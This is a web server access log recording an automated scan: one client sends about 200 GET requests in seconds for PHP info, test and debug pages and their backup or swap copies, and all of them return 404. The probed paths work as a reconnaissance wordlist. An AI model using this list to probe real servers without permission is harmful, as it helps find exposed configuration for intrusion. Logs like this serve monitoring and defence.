043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:35;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:36;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:37;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:38;;/includes/info.php;GET;404
